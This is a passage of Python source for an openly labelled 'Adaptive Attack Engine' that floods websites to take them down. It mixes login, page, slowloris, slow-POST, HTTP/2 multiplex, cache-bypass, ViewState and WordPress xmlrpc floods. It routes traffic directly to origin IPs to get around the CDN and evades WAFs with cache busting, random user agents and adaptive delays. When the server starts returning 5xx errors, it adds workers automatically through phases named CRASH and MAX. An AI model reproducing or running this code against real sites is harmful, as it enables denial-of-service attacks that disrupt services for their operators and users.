                        if self.origin_ip_mode and self.origin_ips:
                            origin_direct_pct = 0.40  # 40% of workers go direct to origin
                            # Reduce other CDN attacks since origin direct is more effective
                            slowpost_pct = 0.05
                            cachedec_pct = 0.05
                            h2mux_pct = 0.02 if HAS_HTTPX else 0
                            login_pct = 0.15
                            page_pct = 0.10
                    else:
                        slowpost_pct = 0
                        h2mux_pct = 0
                        cachedec_pct = 0
                        # Even without CDN, if we have origin IPs, use them
                        if self.origin_ip_mode and self.origin_ips:
                            origin_direct_pct = 0.30

                total = login_pct + page_pct + resource_pct + slowloris_pct + api_pct + graphql_pct + spa_route_pct + ssr_render_pct + viewstate_pct + wp_pct + slowpost_pct + h2mux_pct + cachedec_pct + origin_direct_pct
                if total == 0: total = 1
                login_pct /= total; page_pct /= total; resource_pct /= total
                slowloris_pct /= total; api_pct /= total; graphql_pct /= total
                spa_route_pct /= total; ssr_render_pct /= total
                viewstate_pct /= total; wp_pct /= total
                slowpost_pct /= total; h2mux_pct /= total; cachedec_pct /= total
                origin_direct_pct /= total

                cumulative = 0
                chosen = "page"

                # Origin IP Direct gets highest priority when available
                cumulative += origin_direct_pct
                if r < cumulative: chosen = "origin_direct"
                cumulative += slowpost_pct
                if r < cumulative and chosen == "page": chosen = "slowpost"
                cumulative += h2mux_pct
                if r < cumulative and chosen == "page": chosen = "h2mux"
                cumulative += cachedec_pct
                if r < cumulative and chosen == "page": chosen = "cachedec"
                cumulative += api_pct
                if r < cumulative and chosen == "page": chosen = "api"
                cumulative += graphql_pct
                if r < cumulative and chosen == "page": chosen = "graphql"
                cumulative += spa_route_pct
                if r < cumulative and chosen == "page": chosen = "spa_route"
                cumulative += ssr_render_pct
                if r < cumulative and chosen == "page": chosen = "ssr_render"
                cumulative += login_pct
                if r < cumulative and chosen == "page": chosen = "login"
                cumulative += page_pct
                if r < cumulative and chosen == "page": chosen = "page"
                cumulative += resource_pct
                if r < cumulative and chosen == "page": chosen = "resource"
                cumulative += slowloris_pct
                if r < cumulative and chosen == "page": chosen = "slowloris"
                cumulative += viewstate_pct
                if r < cumulative and chosen == "page": chosen = "viewstate"
                cumulative += wp_pct
                if r < cumulative and chosen == "page": chosen = "wp"

                # Execute a single request cycle
                if chosen == "slowpost":
                    await self._single_slow_post_read(session)
                elif chosen == "h2mux":
                    await self._single_h2_multiplex()
                elif chosen == "cachedec":
                    await self._single_cache_deception(session)
                elif chosen == "login":
                    await self._single_login(session)
                elif chosen == "page":
                    await self._single_page(session, pages)
                elif chosen == "resource":
                    if resources:
                        await self._single_resource(session, resources)
                    else:
                        await self._single_page(session, pages)
                elif chosen == "slowloris":
                    await self._single_slowloris(session)
                elif chosen == "api":
                    endpoints = self.profile.get("api_endpoints", []) or self.attack.get("api_config", {}).get("endpoints", [])
                    if endpoints:
                        await self._single_api(session, endpoints)
                    else:
                        await self._single_page(session, pages)
                elif chosen == "viewstate":
                    await self._single_viewstate(session)
                elif chosen == "wp":
                    wp_config = self.attack.get("wordpress_config", {})
                    await self._single_wp(session, wp_config)
                else:
                    await self._single_page(session, pages)

                # Small delay between requests + adaptive delay for WAF evasion
                if not self._stop.is_set():
                    base_delay = self.request_delay_ms / 1000
                    adaptive_delay = self.adaptive_bypass.get_adaptive_delay() if self.detected_waf else 0
                    await asyncio.sleep(base_delay + adaptive_delay)

            except asyncio.CancelledError:
                break
            except Exception as e:
                # Worker crashed — log and respawn after short delay
                if not self._stop.is_set():
                    await asyncio.sleep(0.1)

    async def _single_login(self, session):
        """Single login attempt"""
        t = time.time()
        try:
            hidden_fields = await self._refresh_viewstate(session) if self.is_aspnet else {}
            form_data = {**hidden_fields,
                        self.username_field: rand_user(),
                        self.password_field: rand_pass()}
            headers = {**self._base_headers(),
                      "Content-Type": "application/x-www-form-urlencoded",
                      "Origin": self.site_root, "Referer": self.url}
            async with session.post(self.url, headers=headers, data=form_data,
                                   ssl=False, allow_redirects=False) as resp:
                body = await resp.text()
                elapsed = time.time() - t
                if "invalid" in body.lower():
                    self._invalid_count += 1
                    self._viewstate_ts = 0
                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                  mode="login", hint=f"Login {resp.status}", url=self.url)
                await self.live_log.add("login", resp.status, elapsed, None, self.url, result.hint)
                self.health_monitor.record(result)
        except asyncio.TimeoutError:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="login", err="Timeout")
            await self.live_log.add("login", None, result.rt, "Timeout", self.url)
            self.health_monitor.record(result)
        except Exception as e:
            msg = type(e).__name__
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="login", err=msg)
            await self.live_log.add("login", None, result.rt, msg, self.url)
            self.health_monitor.record(result)
        self._record(result)

    async def _single_page(self, session, pages):
        """Single page request"""
        if not pages: pages = [self.url]
        url = random.choice(pages)
        t = time.time()
        try:
            busted = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}" if self.enable_cache_bust else url
            async with session.get(busted, headers=self._base_headers(),
                                   ssl=False, allow_redirects=True) as resp:
                body = await resp.text()
                elapsed = time.time() - t
                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                  mode="page", hint=f"Page {resp.status} ({len(body):,}B)", url=url)
                await self.live_log.add("page", resp.status, elapsed, None, url, result.hint)
                self.health_monitor.record(result)
        except asyncio.TimeoutError:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="page", err="Timeout", url=url)
            await self.live_log.add("page", None, result.rt, "Timeout", url)
            self.health_monitor.record(result)
        except Exception as e:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="page", err=type(e).__name__, url=url)
            await self.live_log.add("page", None, result.rt, type(e).__name__, url)
            self.health_monitor.record(result)
        self._record(result)

    async def _single_resource(self, session, resources):
        """Single resource request"""
        url = random.choice(resources)
        t = time.time()
        try:
            busted = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}" if self.enable_cache_bust else url
            headers = {"User-Agent": random_ua(), "Accept": "*/*", "Connection": "keep-alive"}
            async with session.get(busted, headers=headers, ssl=False) as resp:
                data = await resp.read()
                elapsed = time.time() - t
                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                  mode="resource", hint=f"Res {resp.status} ({len(data):,}B)", url=url)
                await self.live_log.add("resource", resp.status, elapsed, None, url, result.hint)
                self.health_monitor.record(result)
        except Exception as e:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="resource", err=type(e).__name__, url=url)
            await self.live_log.add("resource", None, result.rt, type(e).__name__, url)
            self.health_monitor.record(result)
        self._record(result)

    async def _single_slowloris(self, session):
        """Single slowloris request"""
        t = time.time()
        try:
            headers = self._base_headers()
            headers["Content-Length"] = str(random.randint(10000, 100000))
            async with session.get(self.url, headers=headers, ssl=False,
                                   timeout=aiohttp.ClientTimeout(total=30),
                                   allow_redirects=False) as resp:
                await asyncio.sleep(random.uniform(2, 8))
                elapsed = time.time() - t
                result = HitResult(ok=True, code=resp.status, rt=elapsed, mode="slowloris",
                                  hint=f"Slow {elapsed:.1f}s", url=self.url)
                await self.live_log.add("slowloris", resp.status, elapsed, None, self.url, result.hint)
        except asyncio.TimeoutError:
            elapsed = time.time() - t
            result = HitResult(ok=True, code=None, rt=elapsed, mode="slowloris",
                              hint=f"Slow timeout {elapsed:.1f}s", url=self.url)
            await self.live_log.add("slowloris", None, elapsed, None, self.url, "timeout")
        except Exception as e:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="slowloris", err=type(e).__name__)
            await self.live_log.add("slowloris", None, result.rt, type(e).__name__, self.url)
        self.health_monitor.record(result)
        self._record(result)

    async def _single_api(self, session, endpoints):
        """Single API request"""
        endpoint = random.choice(endpoints)
        url = endpoint if endpoint.startswith('http') else f"{self.site_root}{endpoint}"
        t = time.time()
        try:
            busted = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}" if self.enable_cache_bust else url
            headers = {**self._base_headers(), "Accept": "application/json"}
            if random.random() > 0.6:
                payload = json.dumps({"data": rand_user(), "id": random.randint(1, 99999)})
                headers["Content-Type"] = "application/json"
                async with session.post(busted, headers=headers, data=payload,
                                       ssl=False, allow_redirects=False) as resp:
                    elapsed = time.time() - t
                    result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                      mode="api", hint=f"API POST {resp.status}", url=url)
                    await self.live_log.add("api", resp.status, elapsed, None, url, result.hint)
            else:
                async with session.get(busted, headers=headers,
                                       ssl=False, allow_redirects=True) as resp:
                    elapsed = time.time() - t
                    result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                      mode="api", hint=f"API GET {resp.status}", url=url)
                    await self.live_log.add("api", resp.status, elapsed, None, url, result.hint)
            self.health_monitor.record(result)
        except Exception as e:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="api", err=type(e).__name__, url=url)
            await self.live_log.add("api", None, result.rt, type(e).__name__, url)
            self.health_monitor.record(result)
        self._record(result)

    async def _single_viewstate(self, session):
        """Single ViewState flood request"""
        t = time.time()
        try:
            hidden_fields = await self._refresh_viewstate(session)
            form_data = dict(hidden_fields)
            vs_size = len(json.dumps(form_data))
            headers = {**self._base_headers(),
                      "Content-Type": "application/x-www-form-urlencoded",
                      "Origin": self.site_root, "Referer": self.url}
            async with session.post(self.url, headers=headers, data=form_data,
                                   ssl=False, allow_redirects=False) as resp:
                body = await resp.text()
                elapsed = time.time() - t
                if "invalid" in body.lower():
                    self._invalid_count += 1
                    self._viewstate_ts = 0
                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                  mode="viewstate", hint=f"VS {resp.status} ({vs_size}B)", url=self.url)
                await self.live_log.add("viewstate", resp.status, elapsed, None, self.url, result.hint)
                self.health_monitor.record(result)
        except asyncio.TimeoutError:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="viewstate", err="Timeout")
            await self.live_log.add("viewstate", None, result.rt, "Timeout", self.url)
            self.health_monitor.record(result)
        except Exception as e:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="viewstate", err=type(e).__name__)
            await self.live_log.add("viewstate", None, result.rt, type(e).__name__, self.url)
            self.health_monitor.record(result)
        self._record(result)

    async def _single_wp(self, session, wp_config):
        """Single WordPress request"""
        t = time.time()
        try:
            wp_url = f"{self.site_root}/xmlrpc.php"
            payload = f'<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
            headers = {**self._base_headers(),
                      "Content-Type": "text/xml",
                      "Origin": self.site_root, "Referer": self.url}
            async with session.post(wp_url, headers=headers, data=payload,
                                   ssl=False, allow_redirects=False) as resp:
                body = await resp.text()
                elapsed = time.time() - t
                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                  mode="wp", hint=f"WP {resp.status}", url=wp_url)
                await self.live_log.add("wp", resp.status, elapsed, None, wp_url, result.hint)
                self.health_monitor.record(result)
        except asyncio.TimeoutError:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="wp", err="Timeout")
            await self.live_log.add("wp", None, result.rt, "Timeout", self.url)
            self.health_monitor.record(result)
        except Exception as e:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="wp", err=type(e).__name__)
            await self.live_log.add("wp", None, result.rt, type(e).__name__, self.url)
            self.health_monitor.record(result)
        self._record(result)

    async def _single_slow_post_read(self, session):
        """Single Slow POST/READ request — exhaust CDN connection pool"""
        t = time.time()
        try:
            body_size = random.randint(50000, 200000)
            headers = {**self._base_headers(),
                      "Content-Type": "application/x-www-form-urlencoded",
                      "Content-Length": str(body_size),
                      "Connection": "keep-alive",
                      "Origin": self.site_root, "Referer": self.url}
            timeout = aiohttp.ClientTimeout(total=60, sock_read=30)
            async with session.post(self.url, headers=headers, data=self._slow_body(body_size),
                                   ssl=False, timeout=timeout,
                                   allow_redirects=False) as resp:
                elapsed = time.time() - t
                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                  mode="slowpost", hint=f"SPST {resp.status} {elapsed:.1f}s",
                                  url=self.url)
                await self.live_log.add("slowpost", resp.status, elapsed, None, self.url, result.hint)
                self.health_monitor.record(result)
        except asyncio.TimeoutError:
            elapsed = time.time() - t
            result = HitResult(ok=True, code=None, rt=elapsed, mode="slowpost",
                              hint=f"SPST timeout {elapsed:.1f}s", url=self.url)
            await self.live_log.add("slowpost", None, elapsed, None, self.url, "timeout")
            self.health_monitor.record(result)
        except Exception as e:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="slowpost",
                              err=type(e).__name__, url=self.url)
            await self.live_log.add("slowpost", None, result.rt, type(e).__name__, self.url)
            self.health_monitor.record(result)
        self._record(result)

    async def _single_h2_multiplex(self):
        """Single HTTP/2 Multiplexing burst"""
        if not HAS_HTTPX:
            return
        t = time.time()
        try:
            async with httpx.AsyncClient(http2=True, verify=False,
                                         timeout=httpx.Timeout(15.0)) as client:
                num_streams = random.randint(5, 20)
                tasks = []
                for i in range(num_streams):
                    if self._stop.is_set(): break
                    url = self.url
                    if self.enable_cache_bust:
                        url = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}"
                    headers = {"User-Agent": random_ua(), "Accept": "text/html,*/*",
                               "Referer": self.url}
                    tasks.append(client.get(url, headers=headers))
                results = await asyncio.gather(*tasks, return_exceptions=True)
                elapsed = time.time() - t
                success_count = sum(1 for r in results if isinstance(r, httpx.Response) and r.status_code < 500)
                result = HitResult(ok=success_count > 0, code=200 if success_count > 0 else None,
                                  rt=elapsed, mode="h2mux",
                                  hint=f"H2 {success_count}/{num_streams} {elapsed:.1f}s",
                                  url=self.url)
                await self.live_log.add("h2mux", 200 if success_count > 0 else None,
                                       elapsed, None, self.url, result.hint)
                self.health_monitor.record(result)
        except Exception as e:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="h2mux",
                              err=type(e).__name__, url=self.url)
            await self.live_log.add("h2mux", None, result.rt, type(e).__name__, self.url)
            self.health_monitor.record(result)
        self._record(result)

    async def _single_cache_deception(self, session):
        """Single Cache Deception/Bypass request"""
        t = time.time()
        try:
            cache_headers_list = [
                {**self._base_headers(),
                 "Cache-Control": "no-cache, no-store, must-revalidate",
                 "Pragma": "no-cache", "X-Arvan-Cache": "bypass"},
                {**self._base_headers(),
                 "Accept-Encoding": "identity", "Vary": "*"},
                {**self._base_headers(),
                 "Range": "bytes=0-1", "Cache-Control": "max-age=0"},
                {**self._base_headers(),
                 "Cookie": f"nocache={rand_user()}", "X-Requested-With": "XMLHttpRequest"},
            ]
            headers = random.choice(cache_headers_list)
            url = self.url
            trick = random.random()
            if trick < 0.3:
                url = f"{url}{'/' if not url.endswith('/') else ''}.json"
            elif trick < 0.6:
                url = f"{url}{'&' if '?' in url else '?'}nocache={rand_user()}&t={int(time.time())}"
            else:
                url = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}"
            async with session.get(url, headers=headers, ssl=False, allow_redirects=False) as resp:
                body = await resp.text()
                elapsed = time.time() - t
                cache_status = resp.headers.get('X-Cache', resp.headers.get('CF-Cache-Status', ''))
                bypassed = any(x in cache_status.lower() for x in ['miss', 'bypass', 'dynamic', 'expired'])
                hint = f"CD {resp.status}"
                if bypassed: hint += " BYPASS"
                elif cache_status: hint += f" {cache_status}"
                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                  mode="cachedec", hint=hint, url=url)
                await self.live_log.add("cachedec", resp.status, elapsed, None, url, hint)
                self.health_monitor.record(result)
        except asyncio.TimeoutError:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="cachedec",
                              err="Timeout", url=self.url)
            await self.live_log.add("cachedec", None, result.rt, "Timeout", self.url)
            self.health_monitor.record(result)
        except Exception as e:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="cachedec",
                              err=type(e).__name__, url=self.url)
            await self.live_log.add("cachedec", None, result.rt, type(e).__name__, self.url)
            self.health_monitor.record(result)
        self._record(result)

    def _spawn_worker(self, session, all_tasks, vectors, pages, resources, delay=0):
        """Spawn a persistent worker that auto-respawns on failure"""
        t = asyncio.create_task(self._persistent_worker(session, vectors, pages, resources, delay=delay))
        all_tasks.append(t)

    def _render_dashboard(self, cur, max_w, step, mode, health, trend,
                          step_dur, step_remaining, strategy,
                          escalation_phase_display="", new_5xx=0):
        if health > 0.7: hc = C.G
        elif health > 0.4: hc = C.Y
        else: hc = C.R

        mode_colors = {"RAMP": C.G, "NORMAL": C.G, "PRESSURE": C.Y, "CRASH": C.R, "MAXIMUM": f"{C.BD}{C.R}"}
        mc = mode_colors.get(mode, C.W)
        mode_display = f"{mc}{mode}{C.RS}"

        trend_icons = {"improving": f"{C.G}^{C.RS}", "degrading": f"{C.R}v{C.RS}",
                      "stable": f"{C.Y}={C.RS}", "unknown": "?"}
        trend_icon = trend_icons.get(trend, "?")

        bar_len = 10
        filled = int(health * bar_len)
        bar = f"{hc}{'|' * filled}{C.DM}{'.' * (bar_len - filled)}{C.RS}"

        rps = self.stats.rrps
        waf_s = f" WAF:{self.detected_waf}" if self.detected_waf else ""
        cms_s = f" CMS:{self.detected_cms}" if self.detected_cms else ""
        asp_s = " ASP.NET" if self.is_aspnet else ""
        esc_s = f" | Phase:{escalation_phase_display}" if escalation_phase_display else ""
        err5xx_s = f" {C.R}5xx:{new_5xx}{C.RS}" if new_5xx > 0 else ""

        line1 = (f"  {mode_display} | {C.CY}{self.stats.dur:.0f}s{C.RS} | "
                f"W:{cur:,}/{max_w:,} | "
                f"Total:{self.stats.total:,} | "
                f"{C.G}OK:{self.stats.ok:,}{C.RS} {C.R}FAIL:{self.stats.fail:,}{C.RS}{err5xx_s} | "
                f"RPS:{rps:.0f}/s | {C.M}{strategy}{C.RS}{waf_s}{cms_s}{asp_s}{esc_s}")

        line2 = (f"  Health:{bar} {hc}{health:.0%}{C.RS} {trend_icon} | "
                f"RT:{self.stats.rart*1000:.0f}ms | "
                f"Step:+{step} every {step_dur}s | "
                f"Next:{step_remaining:.0f}s | "
                f"{C.DM}[+/-] Workers [q] Quit{C.RS}")

        # Breakdown
        bd_parts = []
        if self.stats.login_fail + self.stats.login_ok > 0: bd_parts.append(f"Auth:{self.stats.login_fail+self.stats.login_ok:,}")
        if self.stats.page_hits > 0: bd_parts.append(f"Page:{self.stats.page_hits:,}")
        if self.stats.resource_hits > 0: bd_parts.append(f"Res:{self.stats.resource_hits:,}")
        if self.stats.slowloris_hits > 0: bd_parts.append(f"Slow:{self.stats.slowloris_hits:,}")
        if self.stats.api_hits > 0: bd_parts.append(f"API:{self.stats.api_hits:,}")
        if self.stats.viewstate_hits > 0: bd_parts.append(f"VS:{self.stats.viewstate_hits:,}")
        if self.stats.wp_hits > 0: bd_parts.append(f"WP:{self.stats.wp_hits:,}")
        if self.stats.slowpost_hits > 0: bd_parts.append(f"SPST:{self.stats.slowpost_hits:,}")
        if self.stats.h2mux_hits > 0: bd_parts.append(f"H2:{self.stats.h2mux_hits:,}")
        if self.stats.cachedec_hits > 0: bd_parts.append(f"CD:{self.stats.cachedec_hits:,}")
        line3 = f"  {C.DM}Breakdown: {' | '.join(bd_parts)}{C.RS}" if bd_parts else ""

        # v5: Adaptive Bypass line — shows WAF bypass strategy
        line4 = ""
        if self.detected_waf and self.adaptive_bypass._total_count > 5:
            ab = self.adaptive_bypass
            bypass_colors = {0: C.G, 1: C.Y, 2: C.M, 3: C.R}
            bc = bypass_colors.get(ab._bypass_level, C.W)
            rate_limited_s = f" {C.R}Blocked:{self.stats.rate_limited:,}{C.RS}" if self.stats.rate_limited > 0 else ""
            line4 = f"  {C.CY}Bypass:{C.RS} {bc}{ab.bypass_level_name}{C.RS} | WAF-Block:{ab.block_rate:.0%}{rate_limited_s} | {C.DM}{ab.get_strategy_summary()}{C.RS}"

        log_lines = self.live_log.get_lines()
        log_display = [self.live_log.format_line(e) for e in log_lines[-8:]]
        while len(log_display) < 8:
            log_display.append(f"  {C.DM}{'.'*60}{C.RS}")

        return line1, line2, line3, line4, log_display

    async def run(self):
        self.stats = Stats()
        self.stats.t0 = time.time()

        vectors = self.attack.get("attack_vectors", ["LOGIN_FLOOD", "PAGE_FLOOD", "RESOURCE_FLOOD"])
        strategy = self.attack.get("recommended_strategy", "GENERIC_FLOOD")
        pages = self.page_targets or [self.url]
        resources = self.resource_targets or [f"{self.site_root}/favicon.ico"]

        # Ensure we have targets
        if not pages:
            pages = [self.url, f"{self.site_root}/"]

        actual_max = self.max_workers

        # ═══ AUTO-ESCALATION ═══
        # Start LOW, gradually increase pressure until server errors appear
        escalation_phase = "WARMUP"  # WARMUP -> RAMP -> PRESSURE -> CRASH -> MAX
        prev_5xx_count = 0
        first_5xx_seen = False
        consecutive_5xx_steps = 0  # How many steps in a row we've seen 5xx

        # Print startup banner
        print(f"\n{'='*72}")
        print(f"  {C.BD}{C.R}VF_TESTER — Adaptive Attack Engine{C.RS}")
        print(f"{'='*72}")
        print(f"  Target:   {C.W}{self.url}{C.RS}")
        print(f"  Strategy: {C.Y}{strategy}{C.RS}")
        if self.detected_waf: print(f"  WAF:      {C.R}{self.detected_waf}{C.RS}")
        if self.detected_cms: print(f"  CMS:      {C.Y}{self.detected_cms}{C.RS}")
        if self.is_aspnet:    print(f"  ASP.NET:  {C.M}ViewState Attack Enabled{C.RS}")
        if self.is_wordpress: print(f"  WordPress:{C.CY} XMLRPC + WP-Login Enabled{C.RS}")
        print(f"  Vectors:  {', '.join(vectors)}")
        print(f"  Workers:  {C.BD}{actual_max:,}{C.RS} (initial: {self.initial_workers}, step: +{self.step})")
        print(f"  Pages:    {len(pages)} | Resources: {len(resources)}")
        print(f"  Mode:     {C.Y}AUTO-ESCALATE — gradually increasing pressure{C.RS}")
        print(f"  Controls: {C.BD}[+]{C.RS} Add workers  {C.BD}[-]{C.RS} Remove  {C.BD}[q]{C.RS} Quit")
        print(f"{'='*72}\n")

        await self.keyboard.start()

        connector = aiohttp.TCPConnector(
            limit=actual_max * 2 + 1000,
            force_close=False,
            enable_cleanup_closed=True,
            ttl_dns_cache=30,
            keepalive_timeout=30,
        )

        timeout = aiohttp.ClientTimeout(total=20)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # Pre-fetch if ASP.NET
            if self.is_aspnet:
                await self._refresh_viewstate(session)

            all_tasks = []
            cur = 0

            # Initial workers — start LOW for auto-escalation
            for _ in range(self.initial_workers):
                delay = random.uniform(0, 2.0)
                self._spawn_worker(session, all_tasks, vectors, pages, resources, delay=delay)
                cur += 1

            while not self._stop.is_set():
                # Handle keyboard
                key = self.keyboard.get_key()
                if key == '+':
                    self._manual_delta += self.step
                elif key == '-':
                    self._manual_delta -= self.step
                elif key == 'q':
                    self._stop.set()
                    break

                # ═══ AUTO-ESCALATION LOGIC ═══
                # Check for 5xx server errors in recent responses
                current_5xx = sum(self.stats.codes.get(c, 0) for c in (500, 502, 503, 504))
                new_5xx = current_5xx - prev_5xx_count
                prev_5xx_count = current_5xx

                if new_5xx > 0:
                    if not first_5xx_seen:
                        first_5xx_seen = True
                        print(f"\n  {C.BD}{C.Y}[5xx FIRST] First server error detected! Server is starting to struggle.{C.RS}")
                    consecutive_5xx_steps += 1
                    escalation_phase = "PRESSURE"
                else:
                    consecutive_5xx_steps = max(0, consecutive_5xx_steps - 1)

                # Calculate auto-escalation step based on phase
                if escalation_phase == "WARMUP":
                    # WARMUP: gradual increase, small steps
                    auto_step = self.step
                    escalation_phase_display = f"{C.G}WARMUP{C.RS}"
                elif escalation_phase == "PRESSURE":
                    # PRESSURE: 5xx detected, increase faster
                    auto_step = self.step * 2
                    escalation_phase_display = f"{C.Y}PRESSURE{C.RS}"
                    if consecutive_5xx_steps >= 3:
                        escalation_phase = "CRASH"
                elif escalation_phase == "CRASH":
                    # CRASH: many 5xx errors, hit hard
                    auto_step = self.step * 4
                    escalation_phase_display = f"{C.R}CRASH{C.RS}"
                    if consecutive_5xx_steps >= 5:
                        escalation_phase = "MAX"
                elif escalation_phase == "MAX":
                    # MAX: server is dying, maximum pressure
                    auto_step = self.step * 6
                    escalation_phase_display = f"{C.BD}{C.R}MAX{C.RS}"
                else:
                    auto_step = self.step
                    escalation_phase_display = f"{C.G}WARMUP{C.RS}"

                # Smart Crash Mode (from health monitor)
                mode, worker_delta = self.health_monitor.get_pressure_advice(
                    cur, actual_max, self.step)

                # Use the LARGER of auto-escalation step or health monitor advice
                effective_delta = max(auto_step, worker_delta)

                # Manual delta
                if self._manual_delta > 0:
                    add_count = min(self._manual_delta, actual_max - cur)
                    if add_count > 0:
                        cur += add_count
                        for _ in range(add_count):
                            self._spawn_worker(session, all_tasks, vectors, pages, resources)
                    self._manual_delta = 0
                elif self._manual_delta < 0:
                    remove_count = min(abs(self._manual_delta), cur)
                    if remove_count > 0:
                        for _ in range(remove_count):
                            if all_tasks:
                                t = all_tasks.pop()
                                t.cancel()
                        cur -= remove_count
                    self._manual_delta = 0

                # Apply auto-escalation
                if effective_delta > 0 and cur < actual_max:
                    new = min(effective_delta, actual_max - cur)
                    if new > 0:
                        cur += new
                        if escalation_phase == "MAX":
                            print(f"\n  {C.BD}{C.R}[!!!] SERVER DYING — MAXIMUM PRESSURE +{new} -> {cur:,}{C.RS}")
                        elif escalation_phase == "CRASH":
                            print(f"\n  {C.R}[CRASH] Server failing — +{new} workers -> {cur:,}{C.RS}")
                        elif escalation_phase == "PRESSURE":
                            print(f"\n  {C.Y}[PRESS] Server struggling — +{new} workers -> {cur:,}{C.RS}")
                        elif mode == "RAMP":
                            print(f"\n  {C.G}[RAMP] Scaling up — +{new} workers -> {cur:,}{C.RS}")
                        for _ in range(new):
                            self._spawn_worker(session, all_tasks, vectors, pages, resources)

                # Bonus pressure when 5xx detected in current step
                if new_5xx > 0:
                    bonus = min(int(self.step * 0.5 * (1 + consecutive_5xx_steps)), actual_max - cur)
                    if bonus > 0:
                        cur += bonus
                        print(f"\n  {C.BD}{C.R}[5xx x{new_5xx}] Server errors! Escalating pressure... +{bonus} -> {cur:,}{C.RS}")
                        for _ in range(bonus):
                            self._spawn_worker(session, all_tasks, vectors, pages, resources)

                self.stats.users = cur

                # Render dashboard
                step_t0 = time.time()
                while time.time() - step_t0 < self.step_duration and not self._stop.is_set():
                    health = self.health_monitor.health_score
                    trend = self.health_monitor.trend
                    step_remaining = self.step_duration - (time.time() - step_t0)
                    line1, line2, line3, line4, log_display = self._render_dashboard(
                        cur, actual_max, self.step, mode, health, trend,
                        self.step_duration, step_remaining, strategy,
                        escalation_phase_display=escalation_phase_display,
                        new_5xx=new_5xx)

                    # v5: 4 lines + optional bypass line + 8 log lines + 2 separators
                    has_bypass_line = bool(line4)
                    total_lines = 4 + (1 if has_bypass_line else 0) + 8 + 2
                    sys.stdout.write(f"\033[{total_lines}A")
                    sys.stdout.write(C.clear_line() + "\r" + line1 + "\n")
                    sys.stdout.write(C.clear_line() + "\r" + line2 + "\n")
                    sys.stdout.write(C.clear_line() + "\r" + line3 + "\n")
                    if has_bypass_line:
                        sys.stdout.write(C.clear_line() + "\r" + line4 + "\n")
                    sys.stdout.write(C.clear_line() + "\r" + f"  {C.DM}{'─'*70}{C.RS}" + "\n")
                    for log_line in log_display:
                        sys.stdout.write(C.clear_line() + "\r" + log_line + "\n")
                    sys.stdout.write(C.clear_line() + "\r" + f"  {C.DM}{'─'*70}{C.RS}" + "\n")
                    sys.stdout.flush()
                    await asyncio.sleep(0.5)

                self._snap()

            # Cleanup
            await self.keyboard.stop()
            self._stop.set()
            if all_tasks:
                done, pending = await asyncio.wait(all_tasks, timeout=3)
                for t in pending: t.cancel()

    def _snap(self):
        self._snaps.append({
            "t": self.stats.dur, "total": self.stats.total,
            "ok": self.stats.ok, "fail": self.stats.fail,
            "rps": self.stats.rrps, "workers": self.stats.users,
            "health": self.health_monitor.health_score,
        })


# ═══════════════════════════════════════════════════════════════════════════════
# Report
# ═══════════════════════════════════════════════════════════════════════════════

def report(st: Stats, url: str, tester: VFTester):
    print(f"\n\n{'='*72}")
    print(f"  {C.BD}{C.R}VF_TESTER — Attack Report{C.RS}")
    print(f"{'='*72}")
    print(f"  Target:   {url}")
    print(f"  Strategy: {tester.attack.get('recommended_strategy', 'AUTO')}")
    if tester.detected_waf: print(f"  WAF:      {tester.detected_waf}")
    if tester.detected_cms: print(f"  CMS:      {tester.detected_cms}")
    print(f"{'─'*72}")

    print(f"\n  +-- {C.BD}Summary{C.RS} ------------------------------------------------+")
    print(f"  | Duration:    {st.dur:.1f}s ({st.dur/60:.1f} min)")
    print(f"  | Total:       {st.total:,}")
    print(f"  | OK:          {C.G}{st.ok:,}{C.RS}")
    print(f"  | Failed:      {C.R}{st.fail:,}{C.RS}")
    print(f"  | RPS:         {st.rps:.1f}")
    if tester._snaps: print(f"  | Max RPS:     {max(s['rps'] for s in tester._snaps):.1f}")
    print(f"  +---------------------------------------------------+")

    print(f"\n  +-- {C.BD}Breakdown{C.RS} ----------------------------------------------+")
    if st.total:
        auth = st.login_fail + st.login_ok
        print(f"  | Auth:       {auth:,} ({auth/st.total*100:.1f}%)")
        print(f"  | Pages:      {st.page_hits:,} ({st.page_hits/st.total*100:.1f}%)")
        print(f"  | Resources:  {st.resource_hits:,} ({st.resource_hits/st.total*100:.1f}%)")
        if st.slowloris_hits: print(f"  | Slowloris:  {st.slowloris_hits:,}")
        if st.api_hits:       print(f"  | API:        {st.api_hits:,}")
        if st.viewstate_hits: print(f"  | ViewState:  {st.viewstate_hits:,}")
        if st.wp_hits:        print(f"  | WordPress:  {st.wp_hits:,}")
        if st.slowpost_hits:  print(f"  | SlowPOST:   {st.slowpost_hits:,}")
        if st.h2mux_hits:     print(f"  | H2 Mux:     {st.h2mux_hits:,}")
        if st.cachedec_hits:  print(f"  | CacheDec:   {st.cachedec_hits:,}")
    print(f"  +---------------------------------------------------+")

